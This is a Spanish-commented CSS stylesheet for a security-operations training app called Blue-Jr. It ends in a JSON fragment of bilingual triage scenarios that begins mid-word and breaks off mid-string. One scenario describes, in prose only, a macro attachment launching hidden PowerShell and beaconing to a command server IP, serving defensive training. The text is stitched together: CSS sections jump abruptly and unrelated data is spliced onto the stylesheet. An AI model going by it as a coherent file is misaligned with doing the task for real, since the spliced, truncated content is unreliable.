/* Blue-Jr · estilos
 * Tokens del sistema de Yoandy (oscuro por defecto, claro con data-theme, siete acentos con data-accent).
 * Movimiento: ease-out fuerte, sin rebote, escala 0,97 al pulsar; con movimiento reducido, solo fundidos. */
:root {
  --font-sans: 'Outfit', ui-sans-serif, system-ui, -apple-system, 'Segoe UI', sans-serif;
  --font-mono: 'Geist Mono', ui-monospace, 'SF Mono', Menlo, monospace;
  /* Oscuro sin negro ni blanco puros: superficie principal #1D2127 y secundaria #252930,
     texto principal #D1D7E0 y secundario #AAAEB6. La profundidad la dan las sombras
     (con un brillo de 1 px arriba), no los bordes. */
  --ground: #171b21; --sidebar: #1d2127; --surface: #1d2127; --surface-2: #252930; --surface-3: #2b3038;
  --hair: rgb(255 255 255 / 0.05); --hair-2: rgb(255 255 255 / 0.10);
  --ink: #d1d7e0; --ink-2: #aaaeb6; --ink-3: #9ea3ab; --ink-4: #6f757e;
  --accent: #6b9bff; --accent-strong: #9dbdff; --accent-ink: #041226;
  --critica: #ff6b6b; --alta: #ffa25a; --media: #e8cb66; --baja: #9ea3ab; --ok: #5ad893; --ko: #ff6b6b;
  --critica-fill: #f03e5a; --alta-fill: #ff9f43; --media-fill: #ffe36e; --baja-fill: #8f9aa6;
  --sh-panel: inset 0 1px 0 rgb(255 255 255 / 0.04), 0 1px 2px rgb(0 0 0 / 0.30), 0 12px 32px -10px rgb(0 0 0 / 0.50);
  --sh-hover: inset 0 1px 0 rgb(255 255 255 / 0.05), 0 2px 4px rgb(0 0 0 / 0.30), 0 22px 44px -14px rgb(0 0 0 / 0.60);
  --sh-overlay: inset 0 1px 0 rgb(255 255 255 / 0.05), 0 8px 20px rgb(0 0 0 / 0.30), 0 28px 72px -12px rgb(0 0 0 / 0.60);
  --glass: rgb(29 33 39 / 0.84); --glass-thick: rgb(29 33 39 / 0.97);
  --r-chip: 6px; --r-control: 10px; --r-card: 14px; --r-panel: 18px;
  --ease-out: cubic-bezier(0.23, 1, 0.32, 1); --ease-drawer: cubic-bezier(0.32, 0.72, 0, 1);
  color-scheme: dark;
}
[data-theme='light'] {
  color-scheme: light;
  --ground: #f3f5f7; --sidebar: #ffffff; --surface: #ffffff; --surface-2: #eef1f4; --surface-3: #e2e6eb;
  --hair: rgb(0 0 0 / 0.07); --hair-2: rgb(0 0 0 / 0.12);
  --ink: #101418; --ink-2: #2c3440; --ink-3: #5c6773; --ink-4: #8b949e;
  --accent: #1a4fe0; --accent-strong: #123db8; --accent-ink: #ffffff;
  --critica: #a8234a; --alta: #9c3d08; --media: #7a5600; --baja: #5c6773; --ok: #146c38; --ko: #a8234a;
  --critica-fill: #a8234a; --alta-fill: #dd6b3d; --media-fill: #eab84f; --baja-fill: #8c96a3;
  --sh-panel: 0 1px 3px rgb(0 0 0 / 0.04), 0 10px 25px -5px rgb(0 0 0 / 0.06);
  --sh-overlay: 0 4px 14px rgb(0 0 0 / 0.08), 0 25px 50px -10px rgb(0 0 0 / 0.16);
  --sh-hover: 0 2px 6px rgb(0 0 0 / 0.06), 0 22px 44px -16px rgb(16 24 40 / 0.22);
  --glass: rgb(255 255 255 / 0.86); --glass-thick: rgb(255 255 255 / 0.97);
}
[data-accent='rosa'] { --accent: #ff7ab8; --accent-strong: #ffc0de; --accent-ink: #3b0620; }
[data-theme='light'][data-accent='rosa'] { --accent: #b8155a; --accent-strong: #9a0f4a; --accent-ink: #ffffff; }
[data-accent='solar'] { --accent: #ffb020; --accent-strong: #ffd27a; --accent-ink: #2a1600; }
[data-theme='light'][data-accent='solar'] { --accent: #8a4a00; --accent-strong: #703c00; --accent-ink: #ffffff; }
[data-accent='glaciar'] { --accent: #5ee7f5; --accent-strong: #b6f6ff; --accent-ink: #042028; }
[data-theme='light'][data-accent='glaciar'] { --accent: #0a6a7d; --accent-strong: #085968; --accent-ink: #ffffff; }
[data-accent='orquidea'] { --accent: #b79bff; --accent-strong: #ddd0ff; --accent-ink: #1a0838; }
[data-theme='light'][data-accent='orquidea'] { --accent: #5b35f0; --accent-strong: #4a22d6; --accent-ink: #ffffff; }
[data-accent='verde'] { --accent: #5aa86a; --accent-strong: #8fd4a0; --accent-ink: #06210f; }
[data-theme='light'][data-accent='verde'] { --accent: #1a6b36; --accent-strong: #12552a; --accent-ink: #ffffff; }
[data-accent='azul'] { --accent: #6b9bff; --accent-strong: #9dbdff; --accent-ink: #041226; }
[data-theme='light'][data-accent='azul'] { --accent: #1a4fe0; --accent-strong: #123db8; --accent-ink: #ffffff; }
[data-accent='rojo'] { --accent: #ff6b6b; --accent-strong: #ffb0b0; --accent-ink: #2a0808; }
[data-theme='light'][data-accent='rojo'] { --accent: #b3141a; --accent-strong: #930f14; --accent-ink: #ffffff; }
:root { --tint: color-mix(in srgb, var(--accent) 14%, transparent); }

/* ---------- Base ---------- */
*, *::before, *::after { box-sizing: border-box; }
html { -webkit-text-size-adjust: 100%; }
body { margin: 0; background: var(--ground); color: var(--ink); font: 400 0.9375rem/1.55 var(--font-sans); -webkit-font-smoothing: antialiased; }
button, input, textarea { font: inherit; color: inherit; }
button { cursor: pointer; }
a { color: var(--accent); text-underline-offset: 3px; }
h1, h2, h3 { margin: 0; letter-spacing: -0.02em; line-height: 1.2; }
p { margin: 0; }
code, kbd, .num { font-variant-numeric: tabular-nums; }
code, kbd { font-family: var(--font-mono); font-size: 0.85em; }
kbd { padding: 1px 6px; border-radius: var(--r-chip); background: var(--surface-3); color: var(--ink-2); border: 1px solid var(--hair-2); white-space: nowrap; }
:focus-visible { outline: 2px solid var(--accent); outline-offset: 2px; border-radius: var(--r-chip); }
.ic { width: 18px; height: 18px; flex: none; fill: none; stroke: currentColor; stroke-width: 2; stroke-linecap: round; stroke-linejoin: round; }
.sr-only { position: absolute !important; width: 1px; height: 1px; padding: 0; margin: -1px; overflow: hidden; clip: rect(0 0 0 0); white-space: nowrap; border: 0; }
.saltar { position: absolute; left: 12px; top: -60px; z-index: 50; padding: 10px 14px; border-radius: var(--r-control); background: var(--accent); color: var(--accent-ink); font-weight: 600; text-decoration: none; transition: top 200ms var(--ease-out); }
.saltar:focus { top: 12px; }
.nota { color: var(--ink-3); font-size: 0.85rem; }
.vacio { color: var(--ink-3); padding: 24px 0; text-align: center; }

/* ---------- Estructura ---------- */
/* Lateral: completo (260 px) o carril de iconos (64 px). En carril se despliega por encima del
   contenido al pasar el ratón o al entrar con el teclado, sin mover la página. */
.app { --lw: 260px; display: grid; grid-template-columns: calc(var(--lw) + 12px) minmax(0, 1fr); min-height: 100dvh; transition: grid-template-columns 320ms var(--ease-drawer); }
body.lateral-compacto .app { --lw: 64px; }
.lateral { --w: var(--lw); position: sticky; top: 0; z-index: 25; height: 100dvh; width: calc(var(--w) + 12px); padding: 12px 0 12px 12px; display: flex; flex-direction: column; overflow: hidden; transition: width 320ms var(--ease-drawer); }
.lateral::before { content: ''; position: absolute; inset: 12px 0 12px 12px; border-radius: 26px; background: var(--sidebar); border: 1px solid var(--hair); box-shadow: var(--sh-panel); z-index: -1; transition: box-shadow 320ms var(--ease-out); }
.lateral > * { width: var(--w); transition: width 320ms var(--ease-drawer); }
body.lateral-compacto .lateral:is(:hover, :focus-within) { --w: 260px; }
body.lateral-compacto .lateral:is(:hover, :focus-within)::before { box-shadow: var(--sh-overlay); }
body.lateral-compacto .lateral :is(.txt, .cuenta, .marca-txt, .cuenta-txt, .acentos) { opacity: 0; transition: opacity 160ms var(--ease-out); }
body.lateral-compacto .lateral:is(:hover, :focus-within) :is(.txt, .cuenta, .marca-txt, .cuenta-txt, .acentos) { opacity: 1; transition-delay: 80ms; }
.lat-cab { display: flex; align-items: center; gap: 12px; padding: 20px 13px 14px; white-space: nowrap; }
.logo { display: grid; place-items: center; width: 38px; height: 38px; border-radius: 12px; background: linear-gradient(135deg, var(--accent), color-mix(in srgb, var(--accent) 55%, #7c4dff)); color: var(--accent-ink); flex: none; box-shadow: 0 6px 18px -6px color-mix(in srgb, var(--accent) 70%, transparent); }
.logo .ic { width: 20px; height: 20px; }
.marca-txt { display: grid; }
.marca-txt b { font-size: 1.15rem; font-weight: 700; letter-spacing: -0.02em; }
.marca-txt span { font: 500 0.6875rem/1.3 var(--font-mono); letter-spacing: 0.1em; color: var(--ink-3); }
.lat-nav { position: relative; padding: 8px 10px; flex: 1; overflow-y: auto; overflow-x: hidden; }
.lat-nav ul { list-style: none; margin: 2px 0 8px; padding: 0; }
/* Entrada del lateral al cargar: cada sección, escalonada 30 ms. */
.lat-nav > a, .lat-nav li { animation: lat-entra 300ms var(--ease-out) backwards; animation-delay: calc(var(--i, 0) * 30ms + 60ms); }
@keyframes lat-entra { from { opacity: 0; transform: translateX(-8px); } }
body.ya-cargado .lat-nav > a, body.ya-cargado .lat-nav li { animation: none; }

.resultado.ko .nota-grande { color: var(--alta); }
.criterios { list-style: none; margin: 0; padding: 0; display: grid; gap: 8px; }
.criterios li { display: grid; grid-template-columns: 18px minmax(0, 1fr) auto; gap: 8px; align-items: start; font-size: 0.8125rem; }
.criterios li.ok > .ic { color: var(--ok); }
.criterios li.ko > .ic { color: var(--alta); }
.crit { display: grid; gap: 2px; }
.crit small { color: var(--ink-3); overflow-wrap: anywhere; }
.criterios .num { font: 600 0.75rem var(--font-mono); color: var(--ink-2); }
.resultado h3 { font-size: 0.875rem; }
.explica { font-size: 0.875rem; color: var(--ink-2); }

/* ---------- Historial ---------- */
.kpis { display: grid; grid-template-columns: repeat(4, minmax(0, 1fr)); gap: 12px; margin-bottom: 14px; }
.kpi { display: grid; gap: 4px; padding: 16px 18px; border-radius: var(--r-panel); background: var(--surface); border: 1px solid var(--hair); box-shadow: var(--sh-panel); }
.kpi span { color: var(--ink-3); font-size: 0.8125rem; }
.kpi b { font-size: clamp(1.5rem, 1.2rem + 1vw, 2rem); letter-spacing: -0.035em; font-weight: 700; white-space: nowrap; }
.kpi b small { font-size: 0.55em; color: var(--ink-3); font-weight: 500; }
.kpi.aviso b { color: var(--alta); }
.hist-rej { display: grid; grid-template-columns: minmax(0, 1.2fr) minmax(0, 1fr); gap: 14px; margin-bottom: 14px; }
.competencias { list-style: none; margin: 14px 0 0; padding: 0; display: grid; gap: 12px; }
.competencias li { display: grid; grid-template-columns: 170px minmax(0, 1fr) 32px; gap: 4px 12px; align-items: center; }
.competencias small { grid-column: 2 / -1; color: var(--ink-3); font: 500 0.6875rem var(--font-mono); }
.c-nom { font-size: 0.875rem; font-weight: 500; }
.c-barra { height: 10px; border-radius: 999px; background: var(--surface-3); overflow: hidden; }
.c-barra i { display: block; height: 100%; border-radius: inherit; background: var(--accent); transition: width 600ms var(--ease-out); }
.c-val { font: 600 0.8125rem var(--font-mono); text-align: right; }
.hist-turnos, .hist-tickets { list-style: none; margin: 0; padding: 0; display: grid; gap: 4px; }
.hist-turnos a { display: grid; grid-template-columns: 36px minmax(0, 1fr) auto 36px; gap: 10px; align-items: center; padding: 8px; border-radius: 12px; color: var(--ink); text-decoration: none; font-size: 0.875rem; transition: background-color 160ms var(--ease-out); }
.hist-turnos a:hover, .hist-tickets a:hover { background: var(--surface-2); }
.hist-turnos .tc-num { width: 32px; height: 32px; border-radius: 10px; font-size: 0.875rem; }
.hist-turnos .num { color: var(--ink-3); font-size: 0.75rem; font-family: var(--font-mono); }
.hist-turnos .estado { justify-content: flex-end; font-family: var(--font-mono); }
.acciones-datos { display: flex; flex-wrap: wrap; gap: 8px; }
.hist-tickets a { display: grid; grid-template-columns: 56px minmax(0, 1fr) auto 44px; gap: 12px; align-items: center; padding: 8px; border-radius: 12px; color: var(--ink); text-decoration: none; font-size: 0.875rem; }
.hist-tickets .id { font: 500 0.75rem var(--font-mono); color: var(--ink-3); }
.ht-tit { min-width: 0; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
.ht-dec { color: var(--ink-3); font-size: 0.8125rem; white-space: nowrap; }
.nota-chip { justify-self: end; font: 600 0.8125rem var(--font-mono); }
.nota-chip.ok { color: var(--ok); } .nota-chip.ko { color: var(--alta); }

/* ---------- Diálogos ---------- */
dialog.dlg { padding: 0; border: 1px solid var(--hair-2); border-radius: 24px; background: var(--glass-thick); color: var(--ink); box-shadow: var(--sh-overlay); width: min(560px, calc(100% - 24px)); max-height: min(86dvh, 820px); backdrop-filter: blur(24px); -webkit-backdrop-filter: blur(24px); }
dialog.dlg.grande { width: min(860px, calc(100% - 24px)); }
dialog.dlg.peq { width: min(440px, calc(100% - 24px)); }
dialog.dlg[open] { display: flex; flex-direction: column; animation: dlg-entra 300ms var(--ease-out) both; }
@keyframes dlg-entra { from { opacity: 0; transform: translateY(8px) scale(0.98); } }
dialog::backdrop { background: rgb(4 6 8 / 0.5); backdrop-filter: blur(4px); }
.perfil-f { display: contents; }
.dlg-cab { display: flex; align-items: center; justify-content: space-between; padding: 18px 18px 10px 24px; }
.dlg-cab h2 { font-size: 1.15rem; }
/* En la columna del diálogo solo se desplaza el cuerpo: cabecera, pestañas y pie no encogen aunque el contenido sea largo. */
dialog.dlg > :not(.dlg-cuerpo) { flex: none; }
.dlg-cuerpo { flex: 1 1 auto; min-height: 0; padding: 8px 24px 20px; overflow-y: auto; display: grid; gap: 12px; align-content: start; outline: none; }
.dlg-cuerpo h3 { font-size: 0.9375rem; margin-top: 8px; }
.dlg-pie { display: flex; align-items: center; justify-content: space-between; gap: 10px; padding: 14px 24px; border-top: 1px solid var(--hair); color: var(--ink-3); font-size: 0.8125rem; }
.dlg.peq .dlg-pie { justify-content: flex-end; }
.tabs { display: flex; gap: 4px; padding: 0 20px; border-bottom: 1px solid var(--hair); overflow-x: auto; scrollbar-width: none; }
.tabs [role='tab'] { position: relative; height: 42px; padding: 0 12px; border: 0; background: none; color: var(--ink-3); font-weight: 500; white-space: nowrap; }
.tabs [role='tab'][aria-selected='true'] { color: var(--ink); }
.tabs [role='tab'][aria-selected='true']::after { content: ''; position: absolute; left: 10px; right: 10px; bottom: -1px; height: 2px; border-radius: 2px; background: var(--accent); }
.pasos { margin: 0; padding: 0; list-style: none; counter-reset: p; display: grid; gap: 12px; }
.pasos li { counter-increment: p; display: grid; grid-template-columns: 30px 1fr; gap: 2px 12px; }
.pasos li::before { content: counter(p); grid-row: span 2; display: grid; place-items: center; width: 30px; height: 30px; border-radius: 10px; background: var(--tint); color: var(--accent); font: 600 0.8125rem var(--font-mono); }
.pasos span { color: var(--ink-2); font-size: 0.875rem; }
.tabla-pesos { width: 100%; border-collapse: collapse; font-size: 0.875rem; }
.tabla-pesos td { padding: 8px 0; border-bottom: 1px solid var(--hair); }
.tabla-pesos td.num { text-align: right; font: 600 0.875rem var(--font-mono); width: 60px; }
.tabla-pesos .total td { font-weight: 700; border-bottom: 0; }
.inventario, .glosario, .atajos { margin: 0; display: grid; gap: 8px; }
.inventario div, .glosario div, .atajos div { display: grid; grid-template-columns: minmax(150px, 220px) 1fr; gap: 12px; padding-bottom: 8px; border-bottom: 1px solid var(--hair); }
.inventario dt, .glosario dt { font-weight: 600; }
.inventario dt .num { color: var(--ink-3); font: 500 0.75rem var(--font-mono); margin-left: 6px; }
dd { margin: 0; color: var(--ink-2); font-size: 0.875rem; }
.autor { display: flex; gap: 14px; align-items: center; }
.autor > div { display: grid; gap: 2px; }
.autor span { color: var(--ink-2); font-size: 0.875rem; }
.enlaces { display: flex; flex-wrap: wrap; gap: 14px; margin-top: 4px; }
.enlaces a { display: inline-flex; align-items: center; gap: 6px; font-size: 0.875rem; }
.enlaces .ic { width: 16px; height: 16px; }
.eco { list-style: none; margin: 0; padding: 0; display: grid; gap: 6px; }
.eco li { display: flex; align-items: center; gap: 12px; padding: 10px 12px; border-radius: 12px; background: var(--surface-2); }
.eco li > div { flex: 1; display: grid; min-width: 0; }
.eco span { color: var(--ink-3); font-size: 0.8125rem; }
dialog.buscar { width: min(620px, calc(100% - 24px)); margin-top: 12dvh; }
.buscar-cab { display: flex; align-items: center; gap: 10px; padding: 14px 16px; border-bottom: 1px solid var(--hair); color: var(--ink-3); }
.buscar-cab input { flex: 1; min-width: 0; border: 0; outline: 0; background: none; font-size: 1rem; color: var(--ink); }
.q-res { padding: 8px; overflow-y: auto; max-height: 56dvh; }
.q-grupo { padding: 10px 10px 4px; font: 500 0.6875rem var(--font-mono); letter-spacing: 0.12em; text-transform: uppercase; color: var(--ink-3); }
.q-item { display: flex; align-items: center; gap: 10px; padding: 9px 10px; border-radius: 10px; cursor: pointer; font-size: 0.875rem; }
.q-item .ic { color: var(--ink-3); width: 16px; height: 16px; }
.q-item[aria-selected='true'], .q-item:hover { background: var(--tint); }

/* ---------- Portada ---------- */
.portada { position: relative; display: flex; align-items: center; min-height: clamp(460px, 26vw + 200px, 620px); padding: 48px 52px; margin-bottom: 18px; border-radius: 28px; background: var(--portada-fondo); border: 1px solid var(--hair); box-shadow: var(--sh-panel); overflow: hidden; isolation: isolate; --portada-fondo: #000414; }
[data-theme='light'] .portada { --portada-fondo: #f6f9fd; }
.p-txt { position: relative; display: grid; gap: 16px; align-content: center; max-width: min(600px, 52%); }
.portada h1 { font-size: clamp(2.4rem, 1.3rem + 3.3vw, 4.4rem); font-weight: 800; line-height: 1; letter-spacing: -0.045em; text-wrap: balance; }
.portada .entradilla { font-size: 1.05rem; max-width: 52ch; text-wrap: pretty; }
.p-cta { display: flex; flex-wrap: wrap; align-items: center; gap: 10px; margin-top: 6px; }
.btn.grande { min-height: 50px; padding: 0 22px; font-size: 0.975rem; }
.btn.grande .ic { width: 18px; height: 18px; }

/* Tarjetas de estadística (StatsCard): vidrio, icono con degradado y elevación de 5 px al pasar. */
.stats { display: grid; grid-template-columns: repeat(4, minmax(0, 1fr)); gap: 14px; margin-bottom: 28px; }
.stat { display: flex; align-items: flex-start; justify-content: space-between; gap: 12px; padding: 22px 22px 20px; border-radius: 20px; background: linear-gradient(180deg, color-mix(in srgb, var(--surface) 92%, white 8%), var(--surface)); border: 1px solid var(--hair); box-shadow: var(--sh-panel); transition: transform 320ms var(--ease-out), box-shadow 320ms var(--ease-out); }
[data-theme='light'] .stat { background: var(--surface); }
.stat-t { color: var(--ink-2); font-size: 0.875rem; }
.stat-v { margin-top: 4px; font-size: clamp(1.7rem, 1.3rem + 1vw, 2.15rem); font-weight: 700; letter-spacing: -0.035em; line-height: 1.1; }
.stat-c { display: inline-flex; align-items: center; gap: 4px; margin-top: 8px; font-size: 0.8125rem; color: var(--ink-3); }
.stat-c.sube { color: var(--ok); font-weight: 500; }
.stat-c .ic { width: 15px; height: 15px; }
.stat-ic { display: grid; place-items: center; width: 46px; height: 46px; flex: none; border-radius: 14px; color: #fff; background: linear-gradient(135deg, var(--g1), var(--g2)); box-shadow: 0 10px 22px -10px var(--g1); }
.stat-ic .ic { width: 21px; height: 21px; }
.tono-a { --g1: var(--accent); --g2: #7c4dff; }
.tono-b { --g1: #12b886; --g2: #0ca5c9; }
.tono-c { --g1: #f59f00; --g2: #f76707; }
.tono-d { --g1: #e64980; --g2: #9c36b5; }
.sec-t { display: flex; align-items: center; gap: 10px; margin: 0 0 14px; font-size: 1.15rem; font-weight: 600; }
.sec-t .ic { color: var(--accent); }

/* Elevación al pasar el ratón: solo con ratón y sin movimiento reducido. */
@media (hover: hover) and (pointer: fine) and (prefers-reduced-motion: no-preference) {
  .stat:hover, .kpi:hover { transform: translateY(-5px); box-shadow: var(--sh-hover); }
  .turno-card:hover { transform: translateY(-4px); box-shadow: var(--sh-hover); }
  .stat:has(:focus-visible), .turno-card:has(:focus-visible) { transform: none; }
}
.kpi { transition: transform 320ms var(--ease-out), box-shadow 320ms var(--ease-out); }

@media (max-width: 1100px) {
  .stats { grid-template-columns: repeat(2, minmax(0, 1fr)); }
}
@media (max-width: 640px) {
  .portada { border-radius: 24px; }
  .p-arte { aspect-ratio: 16 / 10; }
  .p-txt { padding: 0 18px 22px; }
  .stat { padding: 18px; }
  .stat-ic { width: 40px; height: 40px; }
  .p-cta .btn { flex: 1 1 auto; }
}

/* ---------- Portada: titular, reloj e ilustración ---------- */
.portada h1 .pal { display: inline-block; overflow: hidden; vertical-align: top; padding-bottom: 0.08em; margin-bottom: -0.08em; }
.portada h1 .pal > span { display: inline-block; }
.vista.entrando .portada h1 .pal > span { animation: pal-sube 640ms var(--ease-out) backwards; animation-delay: calc(var(--i) * 45ms + 80ms); }
@keyframes pal-sube { from { transform: translateY(105%); } }
.reloj { display: inline-flex; align-items: center; gap: 8px; font: 500 0.8125rem var(--font-mono); color: var(--ink-3); letter-spacing: 0.02em; }
.reloj::before { content: ''; width: 7px; height: 7px; border-radius: 50%; background: var(--accent); box-shadow: 0 0 0 3px color-mix(in srgb, var(--accent) 22%, transparent); }

/* Ilustración de la portada: anclada a la derecha a toda la altura; su borde izquierdo es plano y
   se funde con el fondo de la tarjeta. El ojo se posiciona en % del dibujo (centro del aro: 58,4 % · 24,4 %). */
.p-arte { position: absolute; inset: 0; z-index: -1; overflow: hidden; }
.p-fondo { position: absolute; top: 0; right: 0; height: 100%; aspect-ratio: 1600 / 901; background: var(--portada-oscuro) center / cover no-repeat; -webkit-mask-image: linear-gradient(90deg, transparent, #000 22%); mask-image: linear-gradient(90deg, transparent, #000 22%); transform-origin: 80% 40%; }
[data-theme='light'] .p-fondo { background-image: var(--portada-claro); }
.p-ojo { position: absolute; left: 58.4%; top: 24.4%; width: 2.6%; aspect-ratio: 1; border-radius: 50%; transform: translate(-50%, -50%); box-shadow: 0 0 14px 5px rgb(56 128 255 / 0.55), 0 0 42px 16px rgb(56 128 255 / 0.22); animation: ojo-late 3.2s ease-in-out infinite; }
[data-theme='light'] .p-ojo { box-shadow: 0 0 12px 4px rgb(40 110 255 / 0.45), 0 0 34px 12px rgb(40 110 255 / 0.16); }
@keyframes ojo-late { 50% { opacity: 0.45; } }
.vista.entrando .p-fondo { animation: arte-entra 1100ms var(--ease-out) backwards; }
@keyframes arte-entra { from { opacity: 0; transform: scale(1.06) translateX(18px); } }
.vista.entrando .p-ojo { animation: ojo-enciende 520ms var(--ease-out) 850ms backwards, ojo-late 3.2s ease-in-out 1.4s infinite; }
@keyframes ojo-enciende { from { opacity: 0; transform: translate(-50%, -50%) scale(0.3); } }

@media (max-width: 1100px) {
  /* La ilustración pasa arriba, recortada a la figura, y el texto debajo sobre el fondo plano. */
  .portada { flex-direction: column; align-items: stretch; min-height: 0; padding: 0; }
  .p-arte { position: relative; inset: auto; aspect-ratio: 2 / 1; -webkit-mask-image: linear-gradient(180deg, #000 72%, transparent); mask-image: linear-gradient(180deg, #000 72%, transparent); }
  .p-txt { max-width: none; padding: 0 32px 32px; margin-top: -24px; }
}

/* ---------- Avisos ---------- */
.toasts { position: fixed; right: 20px; bottom: 20px; z-index: 60; display: grid; gap: 8px; justify-items: end; pointer-events: none; }
.toast { display: flex; align-items: center; gap: 10px; padding: 11px 16px; border-radius: 14px; background: var(--ink); color: var(--ground); font-size: 0.875rem; font-weight: 500; box-shadow: var(--sh-overlay); animation: toast 360ms var(--ease-drawer) both; transition: opacity 260ms var(--ease-out), transform 260ms var(--ease-out); }
.toast .ic { width: 17px; height: 17px; }
.toast.sale { opacity: 0; transform: translateY(6px); }
@keyframes toast { from { opacity: 0; transform: translateY(12px); } }

/* ---------- Barra inferior (móvil) ---------- */
.abajo { display: none; }

/* ---------- Adaptación ---------- */
@media (max-width: 1240px) {
  .puesto { grid-template-columns: 230px minmax(0, 1fr); }
  .ticket { grid-column: 1 / -1; position: static; max-height: none; }
}
@media (max-width: 900px) {
  .app, body.lateral-compacto .app { grid-template-columns: minmax(0, 1fr); }
  /* Lo que recibe el foco queda entre la barra superior (con el selector de paneles, fijo) y la barra inferior. */
  html { scroll-padding-top: 136px; scroll-padding-bottom: 104px; }
  .lateral, .solo-escritorio { display: none; }
  .marca-movil { display: inline-flex; }
  .buscar-b { min-width: 0; padding: 0 10px; }
  .buscar-b .txt, .buscar-b kbd { display: none; }
  .columna { padding-left: max(16px, env(safe-area-inset-left)); padding-right: max(16px, env(safe-area-inset-right)); padding-bottom: 110px; }
  .abajo { display: grid; grid-template-columns: repeat(4, 1fr); position: fixed; left: 12px; right: 12px; bottom: calc(10px + env(safe-area-inset-bottom)); z-index: 30; padding: 6px; border-radius: 24px; background: var(--glass-thick); border: 1px solid var(--hair); box-shadow: var(--sh-overlay); backdrop-filter: blur(18px); -webkit-backdrop-filter: blur(18px); }
  .abajo a, .abajo button { display: grid; justify-items: center; gap: 2px; padding: 7px 2px; border: 0; border-radius: 18px; background: none; color: var(--ink-2); text-decoration: none; font-size: 0.6875rem; font-weight: 500; }
  .abajo [aria-current='page'] { background: var(--tint); color: var(--ink); }
  .abajo [aria-current='page'] .ic { color: var(--accent); }
  .toasts { left: 16px; right: 16px; bottom: calc(96px + env(safe-area-inset-bottom)); justify-items: stretch; }
  .seg-movil { display: grid; grid-template-columns: repeat(3, 1fr); gap: 4px; padding: 4px; margin-bottom: 12px; border-radius: 14px; background: var(--surface-2); border: 1px solid var(--hair); position: sticky; top: 76px; z-index: 10; }
  .seg-movil button { height: 38px; border: 0; border-radius: 10px; background: none; color: var(--ink-3); font-weight: 600; font-size: 0.875rem; }
  .seg-movil button[aria-pressed='true'] { background: var(--surface); color: var(--ink); box-shadow: 0 0 0 1px var(--hair-2), var(--sh-panel); }
  .puesto { grid-template-columns: minmax(0, 1fr); }
  .puesto > .panel { display: none; position: static; max-height: none; }
  .puesto[data-panel-activo='cola'] > .cola, .puesto[data-panel-activo='caso'] > .caso, .puesto[data-panel-activo='ticket'] > .ticket { display: block; }
  .kpis { grid-template-columns: repeat(2, minmax(0, 1fr)); }
  .hist-rej { grid-template-columns: minmax(0, 1fr); }
  .regleta { margin: 0 10px 22px; }
  .regleta .tick:nth-child(even) span { display: none; }
}
@media (max-width: 640px) {
  .barra-in { gap: 4px; padding: 6px 8px; }
  .linea { grid-template-columns: 58px minmax(0, 1fr) 14px; }
  .l-s { display: none; }
  .competencias li { grid-template-columns: minmax(0, 1fr) 32px; }
  .c-barra { grid-column: 1 / -1; grid-row: 2; }
  .competencias small { grid-column: 1 / -1; }
  .hist-tickets a { grid-template-columns: 48px minmax(0, 1fr) 36px; }
  .ht-dec { display: none; }
  .hist-turnos a { grid-template-columns: 32px minmax(0, 1fr) 36px; }
  .hist-turnos a > .num:not(.tc-num) { display: none; }
  .inventario div, .glosario div, .atajos div { grid-template-columns: minmax(0, 1fr); gap: 2px; }
  .dlg-cuerpo { padding: 8px 18px 18px; }
  .tc-pie .btn { margin-left: 0; width: 100%; }
}
/* ---------- Entrenador: guía, entidades, tareas, decisión, práctica e insignias ---------- */
.acc { display: inline-flex; align-items: center; padding: 2px 10px; border-radius: 999px; font-size: 0.75rem; font-weight: 600; white-space: nowrap; color: color-mix(in srgb, var(--c) 72%, var(--ink)); background: color-mix(in srgb, var(--c) 14%, transparent); }
.acc-contener { --c: var(--critica); } .acc-escalar { --c: var(--alta); } .acc-cerrar { --c: var(--ok); }
.enlace { display: inline-flex; align-items: center; gap: 6px; padding: 0; border: 0; background: none; color: var(--accent); font: inherit; font-weight: 600; cursor: pointer; text-decoration: underline; text-underline-offset: 3px; text-decoration-thickness: 1px; }
.enlace .ic { width: 15px; height: 15px; }
.decidir-b { margin-top: 10px; font-size: 0.8125rem; }

/* Guía de investigación (plegable) */
.guia { margin: 14px 0 4px; border-radius: 16px; background: color-mix(in srgb, var(--accent) 6%, var(--surface-2)); border: 1px solid color-mix(in srgb, var(--accent) 22%, var(--hair)); }
.guia summary { display: flex; align-items: center; gap: 12px; padding: 12px 14px; cursor: pointer; list-style: none; border-radius: 16px; }
.guia summary::-webkit-details-marker { display: none; }
.guia summary > .ic:first-child { width: 20px; height: 20px; color: var(--accent); flex: none; }
.guia summary span { display: grid; gap: 1px; min-width: 0; }
.guia summary b { font-size: 0.9rem; }
.guia summary small { color: var(--ink-3); font-size: 0.78rem; }
.guia .g-flecha { margin-left: auto; width: 18px; height: 18px; color: var(--ink-3); transition: transform 220ms var(--ease-out); }
.guia[open] .g-flecha { transform: rotate(90deg); }
.guia-cuerpo { padding: 2px 16px 16px; display: grid; gap: 12px; font-size: 0.875rem; }
.g-que { color: var(--ink-2); }
.g-tabs { display: inline-flex; flex-wrap: wrap; gap: 4px; padding: 3px; border-radius: 999px; background: var(--surface); border: 1px solid var(--hair); justify-self: start; }
.g-tabs button { display: inline-flex; align-items: center; gap: 6px; min-height: 32px; padding: 0 12px; border: 0; border-radius: 999px; background: none; color: var(--ink-2); font: 500 0.8rem var(--font-sans); cursor: pointer; }
.g-tabs button .ic { width: 14px; height: 14px; }
.g-tabs button[aria-pressed='true'] { background: var(--tint); color: var(--ink); }
.g-tabs button[aria-pressed='true'] .ic { color: var(--accent); }

redicto":"vp","accion":"contener","campos":[{"id":"equipo","label":{"es":"Equipo afectado","en":"Affected host"},"ok":["PC-FIN-003"]},{"id":"c2","label":{"es":"IP a la que llama","en":"IP it calls out to"},"ok":["203.0.113.99"]}],"mitre":"T1566.001","claves":["PC-FIN-003","203.0.113.99","xlsm"],"competencias":["triaje","correo","endpoint","respuesta"],"explica":{"es":"Un adjunto con macros de un remitente que falla SPF abre PowerShell oculto, descarga un script y empieza a llamar cada 30 segundos a 203.0.113.99. El equipo está comprometido: se aísla desde el EDR, se bloquea la IP y se escala como incidente. Apunta la IP: volverá a salir.","en":"A macro attachment from a sender failing SPF opens hidden PowerShell, downloads a script and starts calling 203.0.113.99 every 30 seconds. The host is compromised: isolate it from the EDR, block the IP and escalate as an incident. Write the IP down: it will come back."}},{"id":"T2-03","hora":"09:50","sev":"baja","fuente":"Correo","regla":{"es":"Fallo de SPF en remitente conocido","en":"SPF failure from a known sender"},"titulo":{"es":"Un proveedor habitual llega con SPF fallido","en":"A regular supplier arrives with failed SPF"},"resumen":{"es":"El correo mensual de 